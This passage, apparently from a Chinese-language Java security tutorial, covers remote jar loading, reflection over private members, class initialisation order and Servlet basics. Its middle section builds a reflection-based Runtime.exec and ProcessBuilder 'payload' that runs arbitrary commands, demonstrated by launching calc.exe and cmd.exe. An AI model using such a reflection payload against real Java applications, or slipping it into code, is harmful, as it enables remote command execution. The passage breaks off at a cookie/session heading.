clazz.getMethod(\"func1\",int.class); // method.invoke(clazz.newInstance(),123); URL url = new URL(\"http://127.0.0.1/LOL.jar\"); URLClassLoader Loader = new URLClassLoader(new URL[]{url}); Class clazz = Loader.loadClass(\"fuck\"); Method method = clazz.getMethod(\"func1\",int.class); method.setAccessible(true); method.invoke(clazz.newInstance(),123); } catch (Exception e){ e.printStackTrace(); } } } \u7136\u540e\u6211\u4eecjar\u5305\u91cc\u7684class\u662f\u8fd9\u4e2a.JAVA\u7684\u7f16\u8bd1\u6587\u4ef6 public class fuck{ public void func1(int input1){ System.out.print(input1); } } \u6267\u884c\u7ed3\u679c \u53cd\u5c04 \u53cd\u5c04\u7684\u57fa\u7840 \u53cd\u5c04\u662fjava\u7684\u4e00\u4e2a\u7279\u6027\uff0c\u7528\u4e8e\u83b7\u53d6\u7c7b\u7684\u8be6\u7ec6\u4fe1\u606f\uff08\u65b9\u6cd5\uff0c\u53d8\u91cf\uff09\uff0c\u5e76\u53ef\u4ee5\u6267\u884c\u7c7b\u4e2d\u7684\u65b9\u6cd5\u3002 \u83b7\u5f97\u4e00\u4e2a\u7c7b\u7684\u7c7b\u5bf9\u8c61 \u8981\u83b7\u53d6\u7c7b\u7684\u8be6\u7ec6\u4fe1\u606f\u6216\u6267\u884c\u5176\u4e2d\u7684\u65b9\u6cd5\uff0c\u9996\u5148\u80af\u5b9a\u662f\u8981\u83b7\u53d6\u5230\u90a3\u4e2a\u7c7b\u7684\u7c7b\u5bf9\u8c61 \u65b9\u6cd5\u4e00:\u6211\u4eec\u9700\u8981\u521b\u5efa\u4e00\u4e2aClass\u7c7b\u578b\u7684\u53d8\u91cf\uff0c\u7528\u4e8e\u63a5\u6536Class.forname(\u201c\u7c7b\u201d)\u8fd4\u56de\u7684\u7c7b\u5bf9\u8c61\u3002\u8fd9\u4e2a\u65b9\u6cd5\u5fc5\u987b\u901a\u8fc7try..catch \u6765\u5904\u7406\u5176\u4e2dClassNotFoundException try{ Class clazz = Class.forname(\"java.lang.String\")\uff1b} catch(ClassNotFoundException e){} \u65b9\u6cd5\u4e8c:\u6211\u4eec\u5b9e\u4f8b\u5316\u4e00\u4e2a\u7c7b\u7684\u5bf9\u8c61\u51fa\u6765\uff0c\u7136\u540e\u901a\u8fc7 \u5bf9\u8c61.getClass()\u83b7\u5f97\u5176\u7c7b\u5bf9\u8c61 String a = new String; Class clazz = a.getclass(); \u65b9\u6cd5\u4e09:\u4f7f\u7528.class Class clazz = String.class; \u8fd9\u6837\uff0c\u6211\u4eec\u5c31\u83b7\u5f97\u4e00\u4e2a\u6307\u5b9a\u7c7b\u7684\u7c7b\u5bf9\u8c61\u4e86\u3002\u5f88\u7b80\u5355\u3002\u6211\u4eec\u53ef\u4ee5\u5bf9\u4e00\u4e2a\u7c7b\u5bf9\u8c61\u4f7f\u7528getName()\u65b9\u6cd5\u83b7\u53d6\u5176\u7c7b\u540d\u3002 System.out.println(clazz.getName()); \u83b7\u53d6\u4e00\u4e2a\u7c7b\u5bf9\u8c61\u7684\u6240\u6709\u6210\u5458 ** \u83b7\u53d6\u5c5e\u6027\u5e76\u4fee\u6539 ** \u5bf9\u7c7b\u5bf9\u8c61\u4f7f\u7528 getFields() \u6216 getDeclaredFields() \u65b9\u6cd5\u5373\u53ef\u83b7\u5f97\u5c5e\u6027\u6570\u7ec4\uff0c\u533a\u522b\u5728\u4e8e\u524d\u8005\u53ea\u80fd\u83b7\u53d6\u516c\u6709\u5c5e\u6027\uff0c\u540e\u8005\u80fd\u83b7\u53d6\u79c1\u6709\u5c5e\u6027\u3002 \u7136\u540e\u904d\u5386\u5c5e\u6027\u6570\u7ec4\uff0c\u901a\u8fc7\u5bf9\u6bcf\u4e00\u9879\u6267\u884cgetName()\u83b7\u53d6\u5c5e\u6027\u540d\uff0cget(\u5b9e\u4f8b\u5316\u7684\u5bf9\u8c61)\u83b7\u5f97\u5c5e\u6027\u503c \u7136\u540e\u5bf9\u67d0\u4e00\u9879\u8fdb\u884c.set()\u5bf9\u5176\u8fdb\u884c\u4fee\u6539 \u8fd9\u91cc\u9700\u8981\u63d0\u7684\u662f\uff0c\u5982\u679c\u8981\u83b7\u5f97\u6216\u4fee\u6539\u79c1\u6709\u5c5e\u6027\u7684\u503c\u7684\u65f6\u5019\uff0c\u9700\u8981\u5bf9\u79c1\u6709\u5c5e\u6027\u4f7f\u7528setAccessible(true)\u6765\u5b9e\u73b0\u79c1\u6709\u8bbf\u95ee import java.lang.reflect.Field; public class test { public static void main(String[] args){ Class clazz = (new abc()).getClass(); abc test = new abc(); Field[] Fields = clazz.getDeclaredFields(); for(Field Field:Fields){ //\u904d\u5386Fields\u6570\u7ec4 try { //\u6267\u884cget()\u65b9\u6cd5\u65f6\u9700\u629b\u51faIllegalAccessException\u9519\u8bef Field.setAccessible(true); //\u5bf9\u6570\u7ec4\u4e2d\u7684\u6bcf\u4e00\u9879\u5b9e\u73b0\u79c1\u6709\u8bbf\u95ee System.out.print(Field.getName()); Object value = Field.get(new abc()); System.out.println(\":\" + value); Field.set(test,\"new\"); //\u4fee\u6539test\u5bf9\u8c61\u4e2d\u7684\u53d8\u91cf } catch (Exception e){ } } System.out.println(test.a); } } class abc{ public String a =new String(\"tom and mary\"); private String b = new String(\"abcdefg\"); } \u8fd0\u884c\u7ed3\u679c \u53e6\u5916\uff0c\u4f60\u4e5f\u53ef\u4ee5\u901a\u8fc7getFiled(\u201c\u5c5e\u6027\u540d\u201d)\u6765\u83b7\u53d6\u7279\u5b9a\u5c5e\u6027\u7684Filed\u5bf9\u8c61\uff0c getDeclaredFields() \u540c\u7406 ** \u83b7\u53d6\u65b9\u6cd5\u5e76\u6267\u884c ** \u63a5\u4e0b\u6765\u662f\u83b7\u53d6\u65b9\u6cd5\u7684\u4e00\u4e9b\u4fe1\u606f \u6211\u4eec\u901a\u8fc7getMethod\u83b7\u53d6\u65b9\u6cd5\u5bf9\u8c61\uff0c\u7136\u540e\u901a\u8fc7getName\u83b7\u53d6\u65b9\u6cd5\u540d\uff0cgetReturnType\u83b7\u53d6\u8fd4\u56de\u503c\u7c7b\u578b\uff0cgetParameterTypes\u83b7\u53d6\u4f20\u5165\u7684\u53c2\u6570\u7c7b\u578b import java.lang.reflect.Field; import java.lang.reflect.Method; public class test { public static void main(String[] args){ Class clazz = (new abc()).getClass(); Method[] methods = clazz.getDeclaredMethods(); for(Method method:methods){ try{ System.out.print(method.getName()); System.out.print(\"|retrunType:\"+method.getReturnType()+\"|\"); Class[] ParameterTypes = method.getParameterTypes(); for(Class ParameterType:ParameterTypes){ System.out.print(\"ParamType:\"+ParameterType.getName()); } System.out.println(\"\"); } catch (Exception e){ } } } } class abc{ public int a =1; private String b = new String(\"abcdefg\"); public void func1(int input1){ System.out.print(input1); } private void func2(int input1){ System.out.print(input1); } } \u63a5\u4e0b\u6765\u662f\u5bf9method\u5bf9\u8c61\u6267\u884cinvoke\u65b9\u6cd5\u8c03\u7528\uff0c\u901a\u8fc7\u4f20\u5165\u53c2\u6570\uff0c\u6307\u5b9a\u5bf9\u8c61\uff0c\u5373\u53ef\u8c03\u7528\u8be5\u65b9\u6cd5\u3002\u6211\u5728\u4e0a\u8ff0\u4ee3\u7801\u4e2d\u6dfb\u52a0\u4e86\u4fee\u6539 import java.lang.reflect.Field; import java.lang.reflect.Method; public class test { public static void main(String[] args){ Class clazz = (new abc()).getClass(); Method[] methods = clazz.getDeclaredMethods(); for(Method method:methods){ try{ System.out.print(method.getName()); System.out.print(\"|retrunType:\"+method.getReturnType()+\"|\"); Class[] ParameterTypes = method.getParameterTypes(); for(Class ParameterType:ParameterTypes){ System.out.print(\"ParamType:\"+ParameterType.getName()); } System.out.println(\"\"); method.setAccessible(true); //\u6253\u5f00\u79c1\u6709\u8bbf\u95ee method.invoke(new abc(),2); //new \u8fd9\u91ccinvoke\u7b2c\u4e00\u4e2a\u53c2\u6570\u6307\u5b9a\u5b9e\u4f8b\u5316\u5bf9\u8c61\uff0c\u4e4b\u540e\u7684\u53c2\u6570\u4ee3\u8868\u4f20\u5165\u65b9\u6cd5\u7684\u53c2\u6570 } catch (Exception e){ } } } } class abc{ public int a =1; private String b = new String(\"abcdefg\"); public void func1(int input1){ System.out.print(input1); } private void func2(int input1){ System.out.print(input1); } } ** \u83b7\u53d6\u6784\u9020\u65b9\u6cd5\u5e76\u6267\u884c ** \u83b7\u5f97\u6784\u9020\u65b9\u6cd5\uff0c\u4e3b\u8981\u662f\u901a\u8fc7 getConstructors()\u548cgetDeclaredConstructors() \uff0c\u540e\u8005\u80fd\u8bbf\u95ee\u79c1\u6709\u5bf9\u8c61,\u4e0b\u9762\u662f\u7528\u904d\u5386\u6cd5\u83b7\u5f97\u6240\u6709\u6784\u9020\u51fd\u6570\u4fe1\u606f import java.lang.reflect.Constructor; public class test { public static void main(String[] args){ try{ Class clazz = Class.forName(\"abc\"); Constructor[] conArray = clazz.getDeclaredConstructors(); for (Constructor a:conArray){ a.setAccessible(true); System.out.println(a); } } catch(Exception e){ } } } class abc{ public abc(String name,int age){ System.out.println(\"\u59d3\u540d\uff1a\"+name+\"\u5e74\u9f84\uff1a\"+ age); } private abc(int age){ System.out.println(\"\u79c1\u6709\u7684\u6784\u9020\u65b9\u6cd5 \u5e74\u9f84\uff1a\"+ age); } } \u6211\u4eec\u521a\u624d\u63d0\u8fc7,getFiled()\u9644\u5e26\u53c2\u6570\u53ef\u4ee5\u6307\u5b9a\u8bbf\u95ee\u67d0\u4e00\u4e2a\u5c5e\u6027\uff0c\u540c\u7406\uff0cgetConstructor\u4e5f\u4e00\u6837\uff0c\u6211\u4eec\u60f3\u8981\u6267\u884c\u67d0\u4e00\u4e2a\u7c7b\u7684\u6784\u9020\u65b9\u6cd5\uff0c\u5f80\u5f80\u8fd9\u4e2a\u65b9\u6cd5\u66f4\u5b9e\u7528 \u8981\u6267\u884c\u4e00\u4e2a\u7c7b\u7684\u6784\u9020\u65b9\u6cd5\uff0c\u90a3\u6211\u4eec\u9700\u8981\u521b\u5efa\u4e00\u4e2a\u8be5\u7c7b\u7684\u5b9e\u4f8b\u5316\u5bf9\u8c61\uff0c\u8fd9\u4e2a\u8fc7\u7a0b\u6211\u4eec\u7528newInstance()\u65b9\u6cd5\u5b9e\u73b0 import java.lang.reflect.Constructor; public class test { public static void main(String[] args){ try{ Class clazz = Class.forName(\"abc\"); Constructor test = clazz.getDeclaredConstructor(int.class); //\u6307\u5b9a\u53c2\u6570\uff0c\u5373\u53ef\u4ece\u591a\u4e2a\u91cd\u8f7d\u7684\u6784\u9020\u51fd\u6570\u6307\u5b9a\u5230\u67d0\u4e2a\u5177\u4f53\u7684\u6784\u9020\u51fd\u6570 test.setAccessible(true); test.newInstance(12); //\u79c1\u6709\u6784\u9020\u65b9\u6cd5\u53ea\u9700\u8c03\u7528\u4e00\u4e0bnewInstance\u4f20\u5165\u53c2\u6570\u5373\u53ef * *Constructor test2 = clazz.getDeclaredConstructor(String.class,int.class); test2.newInstance(\"tom\",15); //\u516c\u6709\u6784\u9020\u65b9\u6cd5\u4e5f\u4e00\u6837 } catch(Exception e){ } } } class abc{ public abc(String name,int age){ System.out.println(\"\u59d3\u540d\uff1a\"+name+\"\u5e74\u9f84\uff1a\"+ age); } private abc(int age){ System.out.println(\"\u79c1\u6709\u7684\u6784\u9020\u65b9\u6cd5 \u5e74\u9f84\uff1a\"+ age); } } \u6267\u884c\u7ed3\u679c \u540c\u65f6\u4e5f\u53ef\u4ee5\u7528 newinstance\u6765\u83b7\u53d6\u4e00\u4e2a\u5bf9\u8c61 \u7b2c\u4e00\u79cd\uff1a\u901a\u8fc7 Class \u5bf9\u8c61\u7684 newInstance() \u65b9\u6cd5\u3002 Class clz = Apple.class; Apple apple = (Apple)clz.newInstance(); \u7b2c\u4e8c\u79cd\uff1a\u901a\u8fc7 Constructor \u5bf9\u8c61\u7684 newInstance() \u65b9\u6cd5 Class clz = Apple.class; Constructor constructor = clz.getConstructor(); Apple apple = (Apple)constructor.newInstance(); \u901a\u8fc7 Constructor \u5bf9\u8c61\u521b\u5efa\u7c7b\u5bf9\u8c61\u53ef\u4ee5\u6839\u636e\u4f20\u5165newinstance\u7684\u53c2\u6570\u9009\u62e9\u7279\u5b9a\u6784\u9020\u65b9\u6cd5\uff0c\u800c\u901a\u8fc7 Class \u5bf9\u8c61\u5219\u53ea\u80fd\u4f7f\u7528\u9ed8\u8ba4\u7684\u65e0\u53c2\u6570\u6784\u9020\u65b9\u6cd5\u3002\u4e0b\u9762\u7684\u4ee3\u7801\u5c31\u8c03\u7528\u4e86\u4e00\u4e2a\u6709\u53c2\u6570\u7684\u6784\u9020\u65b9\u6cd5\u8fdb\u884c\u4e86\u7c7b\u5bf9\u8c61\u7684\u521d\u59cb\u5316\u3002 \u53cd\u5c04\u7684\u8fdb\u9636\u4e0e\u5b89\u5168 Class.forName \u5b9e\u8d28\u4e0e\u7c7b\u521d\u59cb\u5316 Class.forName(\u201c\u2026\u201d) \u5e38\u88ab\u6211\u4eec\u62ff\u6765\u83b7\u5f97\u7c7b\u5bf9\u8c61\uff0c\u4f46\u662f\u5b9e\u9645\u4e0a\uff0cClass.forname\u6709\u4e09\u4e2a\u53c2\u6570\uff0c\u53ea\u4e0d\u8fc7\u6211\u4eec\u9ed8\u8ba4\u8f93\u7b2c\u4e00\u4e2a\u53c2\u6570\uff1a\u7c7b\u540d\u5c31\u80fd\u5b8c\u6210\u5de5\u4f5c\u4e86\u3002 \u8fd9\u662fClass.fornName\u51fd\u6570\u539f\u578b public static Class<?> forName(String name, boolean initialize, ClassLoader loader) Class.forName(className) // \u7b49\u4e8e Class.forName(className, true, currentLoader) \u8fd9\u91cc\u6211\u4eec\u770b\u89c1\u6709\u4e09\u4e2a\u53c2\u6570\uff0c\u7b2c\u4e00\u4e2a\u53c2\u6570\u662f\u6307\u5b9a\u7c7b\u540d\u5c31\u4e0d\u591a\u8bb2\u4e86\uff0c\u7b2c\u4e8c\u4e2a\u53c2\u6570\u662f\u51b3\u5b9a\u7c7b\u662f\u5426\u521d\u59cb\u5316\uff08\u8fd9\u4e2a\u7a0d\u540e\u4f1a\u8be6\u7ec6\u9610\u660e\uff09\uff0c\u7b2c\u4e09\u4e2a\u662fClassLoader\u7c7b\u52a0\u8f7d\u5668\uff08\u544a\u8bc9JVM\u5982\u4f55\u52a0\u8f7d\u8fd9\u4e2a\u7c7b\u8fd9\u91cc\u4e0d\u5c55\u5f00\u8bf4\uff09 \u5173\u4e8e\u4e00\u4e2a\u7c7b\u7684\u521d\u59cb\u5316\uff0c\u6709\u4e09\u79cd\u64cd\u4f5c\u53ef\u4ee5\u5b9e\u73b0:\u6784\u9020\u65b9\u6cd5\uff0c\u7a7a\u5757\u548cstatic\u5757\uff0c\u5c31\u50cf\u8fd9\u6837 public class TrainPrint { { System.out.printf(\"Empty block initial %s\\n\", this.getClass()); } static { System.out.printf(\"Static initial %s\\n\", TrainPrint.class); } public TrainPrint() { System.out.printf(\"Initial %s\\n\", this.getClass()); } } \u90a3\u4e48\u6267\u884c\u987a\u5e8f\u662f\u5982\u4f55\u5462\uff0c\u5728\u5f15\u5165\u7236\u7c7b\u7684\u60c5\u51b5\u4e0b\u53c8\u662f\u5982\u4f55\u5462\uff1f\u6211\u4eec\u5199\u4e2ademo\u770b\u770b import java.lang.reflect.Constructor; public class test { public static void main(String[] args){ abc a = new abc(); } } class b{ { System.out.println(\"b\u7a7a\u5757\u5df2\u6267\u884c\"); } static{ System.out.println(\" b static\u5757\u5df2\u6267\u884c\"); } public b(){ System.out.println(\"b\u7c7b\u6784\u9020\u65b9\u6cd5\u5df2\u6267\u884c\"); } } class abc extends b{ { System.out.println(\"a\u7a7a\u5757\u5df2\u6267\u884c\"); } static{ System.out.println(\" a static\u5757\u5df2\u6267\u884c\"); } public abc() { System.out.println(\"a\u521d\u59cb\u5316\u65b9\u6cd5\u5df2\u6267\u884c\"); } } \u6211\u4eec\u53ef\u4ee5\u6e05\u6670\u7684\u770b\u5230\u6267\u884c\u987a\u5e8f\uff0c\u5bf9\u7ee7\u627f\u7c7b\u6765\u8bf4\uff0c 1.\u4f1a\u5148\u6267\u884c\u7236\u7c7bstatic\u5757 2.\u6267\u884c\u81ea\u5df1\u7684static\u5757 3.\u6267\u884c\u7236\u7c7b\u7a7a\u5feb 4.\u6267\u884c\u7236\u7c7b\u6784\u9020\u65b9\u6cd5 5.\u6267\u884c\u81ea\u5df1\u7a7a\u5feb 6.\u6267\u884c\u81ea\u5df1\u6784\u9020\u65b9\u6cd5 \u5bf9\u4e8e\u4e00\u4e2a\u7c7b\u6765\u8bf4\uff0c\u6267\u884c\u987a\u5e8f\u5219\u662f 1.\u6267\u884cstatic\u5757 2.\u6267\u884c\u7a7a\u5feb 3.\u6267\u884c\u6784\u9020\u65b9\u6cd5 \u90a3\u4e48\u5bf9\u4e8eClass.forName\u6307\u5b9a\u7684\u662f\u5426\u8fdb\u884c\u7c7b\u521d\u59cb\u5316\u53c2\u6570\uff0c\u6307\u7684\u662f\u54ea\u4e2a\u90e8\u5206\uff1fstatic\u5757\uff0c\u7a7a\u5757\u8fd8\u662f\u6784\u9020\u65b9\u6cd5?\u7b54\u6848\u662f\u53ea\u4f1a\u6267\u884cstatic\u5757\u91cc\u7684\uff0c\u4e14\u4f1a\u4f18\u5148\u6267\u884c\u7236\u7c7b\u7684static\u5757\u3002 \u6211\u4eec\u628a\u4e0a\u9762\u4ee3\u7801\u4e2d\u7684\u4e3b\u51fd\u6570\u66ff\u6362\u4e3a try { Class clazz = Class.forName(\"abc\"); } catch (Exception e){} \u6267\u884c\u4e00\u4e0b\uff0c\u770b\u7ed3\u679c\u3002\u53d1\u73b0\u53ea\u6267\u884c\u4e86static\u5757 \u4e5f\u5c31\u662f\u8bf4\uff0cClass.forName()\u4f1a\u9ed8\u8ba4\u6267\u884c\u7c7b\u7684static\u4ee3\u7801\u5757\uff0c\u662f\u4e2a\u6bd4\u8f83\u5371\u9669\u7684\u4fe1\u53f7\u3002 \u53e6\u5916\u4e00\u63d0\uff0cxxx.class.newinstance() \u4e5f\u4f1a\u81ea\u52a8\u8c03\u7528\u7c7b\u7684\u6784\u9020\u65b9\u6cd5\uff0cstatic\u5757\u548c\u7a7a\u5757\uff0c\u65e0\u8bba\u662f\u6709\u53c2\u6570\u8fd8\u662f\u65e0\u53c2\u6570\uff0cnew\u5173\u952e\u5b57\u548cnewinstance\u5728\u8fd9\u4e00\u70b9\u4e0a\u662f\u4e00\u6837\u7684\u3002 Runtime\u6267\u884c\u547d\u4ee4\u89e3\u6790 \u4e00\u822c\u6765\u8bf4\uff0c\u6211\u4eec\u8c03\u7528Runtime\u7c7b\u6765\u6267\u884c\u547d\u4ee4\u65f6\u7684\u6307\u5b9a\u662f\u8fd9\u6837\u7684 Runtime.getRuntime().exe() \u6211\u4eec\u5230\u6e90\u7801\u91cc\u5206\u6790\u8fd9\u6bb5\u4ee3\u7801 \u53ef\u89c1\uff0c\u5f53\u6211\u4eec\u5bf9Runtime\u7c7b\u6267\u884cgetRuntime()\u65f6\u4f1a\u5f97\u5230\u4e00\u4e2aRuntime\u5bf9\u8c61\uff0c\u7136\u540e\u6211\u4eec\u5c31\u53ef\u4ee5\u8c03\u7528\u6211\u4eec\u7684exec\u65b9\u6cd5\u4e86 \u540c\u65f6\uff0cRuntime() \u88abprivate\u4fee\u9970\u7b26\u4fee\u9970\u4e86\uff0c\u8fd9\u8bf4\u660e\u6211\u4eec\u65e0\u6cd5\u901a\u8fc7Runtime a = new Runtime()\u6765\u5b9e\u73b0\u4e00\u4e2aRuntime\u7684\u5bf9\u8c61\u3002 \u6240\u4ee5\u8bf4\uff0c\u6211\u4eec\u6b63\u5e38\u5730\u4f7f\u7528runtime\u6765\u6267\u884c\u547d\u4ee4\u53ea\u80fd\u4f9d\u9760\u4ee5\u4e0a\u4ee3\u7801\u3002 \u90a3\u4e48\u6211\u4eec\u8981\u662f\u60f3\u8981\u4f9d\u9760\u53cd\u5c04\u6765\u5199\u4e00\u4e2aRuntime\u6267\u884c\u4efb\u610f\u547d\u4ee4\u7684payload\uff0c\u90a3\u4e48\u8be5\u5982\u4f55\u5199\u5462\uff1f \u5148\u6765\u4e00\u4e2a\u9519\u8bef\u793a\u8303\uff0c\u5f53\u6211\u4eec\u7528\u5e38\u89c4\u7684\u601d\u8def\u53bb\u5b9e\u73b0\u65f6\u3002\u6211\u4eec\u76f4\u63a5\u8c03\u7528Runtime\u7c7b\u91cc\u7684exec\u65b9\u6cd5\uff0c\u7136\u540e\u901a\u8fc7newInstance\u6765\u5b9e\u4f8b\u5316\u4e00\u4e2aRuntime\u5bf9\u8c61 Class clazz = Class.forName(\"java.lang.Runtime\"); Method method = clazz.getMethod(\"exec\", String.class); method.setAccessible(true); method.invoke(clazz.newInstance(),\"calc.exe\"); \u6700\u7ec8\u7ed3\u679c\u5219\u662f\u62a5\u9519\uff1aclass test cannot access a member of class java.lang.Runtime (in module java.base) with modifiers \u201cprivate\u201d \u770b\u6765\u901a\u8fc7\u53cd\u5c04\u4e5f\u4e0d\u80fd\u76f4\u63a5\u8c03\u7528exec\u65b9\u6cd5\uff0c\u6216\u8005\u8bf4\u4e0d\u80fd\u5b9e\u4f8b\u5316Runtime\u5bf9\u8c61\u3002 \u90a3\u4e48\u6b63\u786e\u601d\u8def\u8be5\u662f\u4ec0\u4e48\u5462\uff1f\u5e94\u8be5\u662f\u5148\u8c03\u7528getRuntime\u83b7\u5f97Runtime\u5bf9\u8c61\uff0c\u7136\u540e\u518d\u8c03\u7528exec\u65b9\u6cd5 Class clazz = Class.forName(\"java.lang.Runtime\"); Method MgetRuntime = clazz.getMethod(\"getRuntime\"); Object runtime = MgetRuntime.invoke(clazz); //\u5bf9\u7c7b\u5bf9\u8c61\u4f7f\u7528getRuntime(),\u5176\u5b9e\u5c31\u76f8\u5f53\u4e8eRuntime.getRuntime()\u3002\u8fd9\u79cd\u65b9\u5f0f\u4ec5\u9650static\u65b9\u6cd5 Method Mexec = clazz.getMethod(\"exec\", String.class); Mexec.invoke(runtime,\"calc.exe\"); \u6700\u7ec8\u5f39\u51fa\u8ba1\u7b97\u5668\u3002 ProcessBuilder\u6267\u884c\u547d\u4ee4\u7684\u53cd\u5c04\u5b9e\u73b0 \u9664\u4e86Runtime\u4ee5\u5916\uff0c\u8fd8\u53ef\u4ee5\u7528ProcessBuilder\u7c7b\u6765\u6267\u884c\u547d\u4ee4\u3002 \u5b83\u7684\u6b63\u5e38\u60c5\u51b5\u4f7f\u7528\u5982\u4e0b. ProcessBuilder pb = new ProcessBuilder(\"calc.exe\"); pb.start(); \u6211\u4eec\u6765\u5206\u6790\u4e00\u4e0bProcessBuilder\u7684\u6784\u9020\u65b9\u6cd5\uff0c\u5b83\u7684\u6784\u9020\u65b9\u6cd5\u6709\u5f88\u591a\u4e2a\u91cd\u8f7d\uff0c\u6211\u4eec\u5206\u6790\u4e00\u4e2a\u5427\u3002 \u53ef\u89c1\uff0cProcessBuilder\u7684\u6784\u9020\u65b9\u6cd5\u628a\u4f20\u5165\u53c2\u6570\u4fdd\u5b58\u5230\u4e86command\u5c5e\u6027\u91cc\uff0c\u7136\u540ecommad\u4f1a\u88ab\u4ee5\u7cfb\u7edf\u547d\u4ee4\u8c03\u7528\uff08\u8fd9\u90e8\u5206\u4ee3\u7801\u5c31\u4e0d\u8d34\u51fa\u6765\u4e86\uff09\u3002 \u90a3\u4e48\u4ee5\u53cd\u5c04\u7684\u5f62\u5f0f\u8be5\u5982\u4f55\u5b9e\u73b0\u5462\u3002 Class clazz = Class.forName(\"java.lang.ProcessBuilder\"); Method start = clazz.getMethod(\"start\"); start.invoke(clazz.getConstructor(List.class).newInstance(Arrays.asList(\"cmd.exe\"))); Servlet Servlet\u751f\u547d\u5468\u671f ** 1 **.\u8c03\u7528init()\u65b9\u6cd5\u8fdb\u884c\u521d\u59cb\u5316 init()\u65b9\u6cd5\u5728\u7b2c\u4e00\u6b21\u521b\u5efaservlet\u65f6\u88ab\u8c03\u7528\uff0c\u7528\u4e8e\u8fdb\u884c\u521d\u59cb\u5316\u64cd\u4f5c\u3002 public void init() throws ServletException{...code...} ** 2 **.\u8c03\u7528service()\u65b9\u6cd5\u5904\u7406\u5ba2\u6237\u7aef\u8bf7\u6c42 web\u670d\u52a1\u5668\uff0c\u5373servlet\u5bb9\u5668\u8c03\u7528service()\u65b9\u6cd5\u5904\u7406\u6765\u81ea\u5ba2\u6237\u7aef\u7684\u8bf7\u6c42\uff0c\u5e76\u8fd4\u56de\u54cd\u5e94\u3002\u540c\u65f6\u6839\u636e\u5ba2\u6237\u7aef\u8bf7\u6c42\u7684\u7c7b\u578b\uff08Get\uff0cPost\uff0cdelete\u7b49\uff09\uff0c\u505a\u51fa\u4e0d\u540c\u7684\u884c\u4e3a\uff0c\u8fd9\u4e9b\u884c\u4e3a\u662f\u7531service\u65b9\u6cd5\u62bd\u8c61\u51fa\u7684\u5176\u4ed6\u65b9\u6cd5\uff08doGet\uff0cdoPost\u7b49\uff09\u3002 \u6240\u4ee5\u8fd9\u91cc\u8bf4\u7684\u8c03\u7528service()\u65b9\u6cd5\u4e5f\u5c31\u662f\u7b49\u540c\u4e8e\u8c03\u7528doGet\uff0cdoPost\u7b49\u65b9\u6cd5\u3002 doPost,doDelete\u7b49\u65b9\u6cd5\u7684\u5b9a\u4e49\u5f62\u540c\u4e8e\u4e0b public void doGet(HttpServletRequest request,HttpServletResponse response) throws ServletException,IOException{...code...} ** 3 **.\u8c03\u7528distroy()\u5728Servlet\u9500\u6bc1\u524d\u5b8c\u6210\u6e05\u7406\u6d3b\u52a8 distrtoy()\u51fd\u6570\u53ea\u8c03\u7528\u4e00\u6b21\uff0c\u5728Servlet\u88ab\u9500\u6bc1\u524d\u5b8c\u6210\u540e\u53f0\u7ebf\u7a0b\u505c\u6b62\uff0c\u6570\u636e\u5e93\u94fe\u63a5\u5173\u95ed\u7b49\u4e00\u7cfb\u5217\u6e05\u7406\u5de5\u4f5c\u3002 public void destroy() { // \u7ec8\u6b62\u5316\u4ee3\u7801... } \u7f16\u5199\u4e00\u4e2a\u7b80\u5355\u7684Servlet \u6211\u4eec\u5199\u4e00\u4e2a\u7a0b\u5e8f\uff0c\u7528\u6765\u63a7\u5236Get\u8bf7\u6c42\u7684\u54cd\u5e94 import javax.servlet.*; import javax.servlet.annotation.WebServlet; import javax.servlet.http.*; import java.io.*; @WebServlet(\"/a\") //\u7528\u4e8e\u8bbe\u5b9a\u8def\u7531 public class test extends HttpServlet { @Override public void doGet(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException { response.setContentType(\"text/html\"); PrintWriter out = response.getWriter(); out.println(\"<h1>\" + \"a\" + \"</h1>\"); } } \u81f3\u4e8e\u90e8\u7f72\u6211\u662f\u53c2\u8003\u7684\u8fd9\u4e2a\u6587\u7ae0 https://blog.csdn.net/gaoqingliang521/article/details/108677301 \u6211\u7684\u7248\u672c\u65f6idea 2020.2\uff0c\u53ef\u80fd\u4f1a\u6709\u51fa\u5165\u3002 \u5904\u7406\u4f20\u53c2 servlet\u5904\u7406\u4f20\u53c2\u4e3b\u8981\u662f\u901a\u8fc7doGet\u548cdoPost\u65b9\u6cd5\u8fdb\u884c\u7684\u3002 \u63a5\u6536\u53c2\u6570\u503c\u4e3b\u8981\u662f\u9760\u4e0b\u9762\u7684\u65b9\u6cd5 getParameter()\uff1a \u60a8\u53ef\u4ee5\u8c03\u7528 request.getParameter() \u65b9\u6cd5\u6765\u83b7\u53d6\u8868\u5355\u53c2\u6570\u7684\u503c\u3002 getParameterValues()\uff1a \u5982\u679c\u53c2\u6570\u51fa\u73b0\u4e00\u6b21\u4ee5\u4e0a\uff0c\u5219\u8c03\u7528\u8be5\u65b9\u6cd5\uff0c\u5e76\u8fd4\u56de\u591a\u4e2a\u503c\uff0c\u4f8b\u5982\u590d\u9009\u6846\u3002 getParameterNames()\uff1a \u5982\u679c\u60a8\u60f3\u8981\u5f97\u5230\u5f53\u524d\u8bf7\u6c42\u4e2d\u7684\u6240\u6709\u53c2\u6570\u7684\u5b8c\u6574\u5217\u8868\uff0c\u5219\u8c03\u7528\u8be5\u65b9\u6cd5\u3002 \u6211\u4eec\u5199\u4e2ademo\u8bd5\u8bd5 import javax.servlet.*; import javax.servlet.annotation.WebServlet; import javax.servlet.http.*; import java.io.*; @WebServlet(\"/a\") public class test extends HttpServlet { @Override public void doGet(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException { response.setContentType(\"text/html\"); PrintWriter out = response.getWriter(); String name = new String(request.getParameter(\"name\")); out.println(\"your name is \"+name); } } \u8fd9\u4e2ademo\u4e3b\u8981\u7528\u4e8e\u63a5\u6536get\u6570\u636e\uff0c\u5e76\u505a\u51fa\u4e00\u4e9b\u5904\u7406\u8fd4\u56de. \u90a3\u4e48\u5982\u4f55\u63a5\u6536POST\u6570\u636e\u5462\uff1f\u548cdoGet\u5dee\u4e0d\u591a import javax.servlet.*; import javax.servlet.annotation.WebServlet; import javax.servlet.http.*; import java.io.*; @WebServlet(\"/a\") public class test extends HttpServlet { public void doPost(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException { response.setContentType(\"text/html\"); PrintWriter out = response.getWriter(); String name = new String(request.getParameter(\"name\")); out.println(\"[Post]your name is \"+name); } } \u9700\u8981\u6ce8\u610f\u7684\u662f\uff0c\u8fd9\u91cc\u7684request.getParameter(\"name\")\u4f1a\u4f18\u5148\u9009\u62e9\u5728url\u91cc\u7684\u53c2\u6570\uff0c\u800c\u4e0d\u662fhttp\u5305\u4f53\u7684\u53c2\u6570 cookie\\&session ** cookie ** 